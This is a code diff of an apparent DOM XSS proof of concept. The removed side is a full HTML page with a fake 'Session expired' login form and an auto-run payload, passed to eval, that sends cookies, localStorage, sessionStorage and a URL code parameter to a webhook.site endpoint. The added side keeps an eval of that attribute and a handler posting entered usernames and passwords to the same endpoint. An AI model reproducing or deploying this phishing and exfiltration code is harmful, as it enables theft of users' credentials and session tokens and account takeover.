@@ -1,63 +1,29 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>PoC DOM XSS - ozone.js</title>
-    <meta charset="UTF-8" />
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
-    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
-  </head>
-  <body>
-    <h2>Session expired. Please login again</h2>
-    <form id="fakeLogin">
-      <input type="text" id="username" placeholder="Email" /><br />
-      <input type="password" id="password" placeholder="Password" /><br />
-      <button type="submit">Login</button>
-    </form>
+<script>
+  window.onload = () => {
+    try {
+      const select = document.querySelector('select[data-mapper]');
+      const mapper = select?.getAttribute('data-mapper');
+      if (mapper) {
+        const func = eval(mapper);
+        if (typeof func === "function") func();
+      }
+    } catch (e) {
+      console.error("Error ejecutando mapper:", e);
+    }
+  };
 
-    <select
-      class="select2"
-      data-src-url="/api/data"
-      data-mapper="()=>{ 
-        const code = new URLSearchParams(location.search).get('code'); 
-        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            code: code,
-            cookie: document.cookie,
-            localStorage: {...localStorage},
-            sessionStorage: {...sessionStorage}
-          })
-        });
-      }"
-    >
-      <option selected>Trigger</option>
-    </select>
-
-    <script>
-      window.onload = () => {
-        const select = document.querySelector('select[data-mapper]');
-        const mapper = select?.getAttribute('data-mapper');
-        if (mapper) {
-          eval(mapper)(); // Ejecuta el payload automáticamente
-        }
-      };
-
-      document.getElementById("fakeLogin").addEventListener("submit", function (e) {
-        e.preventDefault();
-        const user = document.getElementById("username").value;
-        const pass = document.getElementById("password").value;
-        fetch("https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username: user,
-            password: pass,
-          }),
-        });
-      });
-    </script>
-  </body>
-</html>
+  document.getElementById("fakeLogin").addEventListener("submit", function (e) {
+    e.preventDefault();
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+    fetch("https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: user,
+        password: pass,
+      }),
+    });
+  });
+</script>
 
